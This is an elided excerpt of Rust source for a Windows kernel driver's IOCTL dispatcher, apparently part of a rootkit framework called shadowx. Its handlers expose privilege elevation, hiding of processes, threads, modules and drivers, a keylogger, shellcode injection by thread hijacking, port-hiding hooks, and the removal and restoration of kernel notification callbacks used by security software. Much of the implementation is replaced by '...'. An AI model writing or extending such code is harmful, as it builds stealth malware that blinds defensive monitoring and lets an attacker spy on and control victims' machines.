...
use common::{enums::*, ioctls::*, structs::*};
use core::sync::atomic::{AtomicPtr, Ordering};
use shadowx::error::ShadowError;
use spin::{Lazy, Mutex};
use wdk_sys::*;

use crate::utils::{get_input_buffer, get_output_buffer};

use shadowx::{Network, Process, Thread, network};
use shadowx::{PROCESS_INFO_HIDE, THREAD_INFO_HIDE};
...
type IoctlHandler =
    Box<dyn Fn(*mut IRP, *mut IO_STACK_LOCATION) -> Result<NTSTATUS, ShadowError> + Send + Sync>;
...
impl IoctlManager {
    ...
    fn process(&mut self) {
        ...
        self.register_handler(
            ELEVATE_PROCESS,
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let status = if (*target_process).enable {
                        ...
                        // Unhides the process.
                        let list_entry = PROCESS_INFO_HIDE
                            .lock()
                            .iter()
                            .find(|p| p.pid == pid)
        ...
        self.register_handler(
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let (output_buffer, max_entries) =
                        get_output_buffer::<TargetProcess>(irp, stack)?;
                    ...
                    (*irp).IoStatus.Information =
                        (entries_to_copy * size_of::<TargetProcess>()) as u64;
                    Ok(STATUS_SUCCESS)
                }
            }),
        );
    ...
    fn misc(&mut self) {
        ...
        self.register_handler(
            KEYLOGGER,
            Box::new(|irp: *mut IRP, _: *mut IO_STACK_LOCATION| {
                unsafe {
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    if protected_ports.is_empty()
                        && !network::HOOK_INSTALLED.load(Ordering::Relaxed)
                    {
                    ...
                    if NT_SUCCESS(status)
                        && network::PROTECTED_PORTS.lock().is_empty()
                        && network::HOOK_INSTALLED.load(Ordering::Relaxed)
                    {
        ...
        self.register_handler(
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    (*irp).IoStatus.Information =
                        (entries_to_copy * size_of::<ModuleInfo>()) as u64;
                    Ok(STATUS_SUCCESS)
                }
            }),
        );
        ...
        self.register_handler(
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let status = shadowx::Module::hide_module(
                        (*target).pid,
                        &(*target).module_name.to_lowercase(),
                    )?;
    ...
    fn injection(&mut self) {
        ...
        self.register_handler(
            INJECTION_SHELLCODE_THREAD_HIJACKING,
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    // Get the input buffer with the injection data.
                    let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let status = if (*target_driver).enable {
                        ...
                        let (previous_list, previos_ldr_data) =
                            shadowx::Driver::hide_driver(driver_name)?;
                        ...
                        let (list_entry, ldr_data) = DRIVER_INFO_HIDE
                            .lock()
                            .iter()
        ...
        self.register_handler(
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    // Set the size of the returned information.
                    (*irp).IoStatus.Information =
                        (entries_to_copy * size_of::<DriverInfo>()) as u64;
                    Ok(STATUS_SUCCESS)
                }
            }),
        );
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let status = if (*target_thread).enable {
                        ...
                        // Unhides the thread.
                        let list_entry = THREAD_INFO_HIDE
                            .lock()
                            .iter()
                            .find(|p| p.tid == tid)
        ...
        self.register_handler(
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let (output_buffer, max_entries) =
                        get_output_buffer::<TargetThread>(irp, stack)?;
                    ...
                    (*irp).IoStatus.Information =
                        (entries_to_copy * size_of::<TargetThread>()) as u64;
                    Ok(STATUS_SUCCESS)
                }
            }),
        );
        ...
        self.register_handler(
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let (callback_info, max_entries) =
                        get_output_buffer::<CallbackInfoOutput>(irp, stack)?;
                    let callbacks = match (*target_callback).callback {
                        ...
                        | Callbacks::PsSetLoadImageNotifyRoutine => {
                            shadowx::Callback::enumerate((*target_callback).callback)?
                        }

                        Callbacks::CmRegisterCallbackEx => {
                            shadowx::CallbackRegistry::enumerate((*target_callback).callback)?
                        }

                        Callbacks::ObProcess | Callbacks::ObThread => {
                            shadowx::CallbackOb::enumerate((*target_callback).callback)?
                        }
                    };
                    ...
                    for (index, callback) in callbacks.iter().take(entries_to_copy).enumerate() {
                        ...
                        // Ensure the name is not copied beyond the buffer size
                        let name_length =
                            core::cmp::min(callback.name.len(), (*info_ptr).name.len());
                        core::ptr::copy_nonoverlapping(
                    ...
                    // Set the size of the returned information.
                    (*irp).IoStatus.Information =
                        (entries_to_copy * size_of::<CallbackInfoOutput>()) as u64;
                    Ok(STATUS_SUCCESS)
                }
            }),
        );
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let status = match (*target_callback).callback {
                        Callbacks::PsSetCreateProcessNotifyRoutine
                        | Callbacks::PsSetCreateThreadNotifyRoutine
                        | Callbacks::PsSetLoadImageNotifyRoutine => shadowx::Callback::remove(
                            (*target_callback).callback,
                            (*target_callback).index,
                        )?,

                        Callbacks::CmRegisterCallbackEx => shadowx::CallbackRegistry::remove(
                            (*target_callback).callback,
                            (*target_callback).index,
                        )?,

                        Callbacks::ObProcess | Callbacks::ObThread => shadowx::CallbackOb::remove(
                            (*target_callback).callback,
                            (*target_callback).index,
                        )?,
                    };
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let status = match (*target_callback).callback {
                        Callbacks::PsSetCreateProcessNotifyRoutine
                        | Callbacks::PsSetCreateThreadNotifyRoutine
                        | Callbacks::PsSetLoadImageNotifyRoutine => shadowx::Callback::restore(
                            (*target_callback).callback,
                            (*target_callback).index,
                        )?,

                        Callbacks::CmRegisterCallbackEx => shadowx::CallbackRegistry::restore(
                            (*target_callback).callback,
                            (*target_callback).index,
                        )?,

                        Callbacks::ObProcess | Callbacks::ObThread => shadowx::CallbackOb::restore(
                            (*target_callback).callback,
                            (*target_callback).index,
                        )?,
                    };
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    ...
                    let callbacks = match (*target_callback).callback {
                        ...
                        | Callbacks::PsSetCreateThreadNotifyRoutine
                        | Callbacks::PsSetLoadImageNotifyRoutine => {
                            shadowx::Callback::enumerate_removed()?
                        }

                        Callbacks::CmRegisterCallbackEx => {
                            shadowx::CallbackRegistry::enumerate_removed()?
                        }

                        Callbacks::ObProcess | Callbacks::ObThread => {
                            shadowx::CallbackOb::enumerate_removed()?
                        }
                    };
    ...
    fn registry(&mut self) {
        ...
        self.register_handler(
            ...
            Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| unsafe {
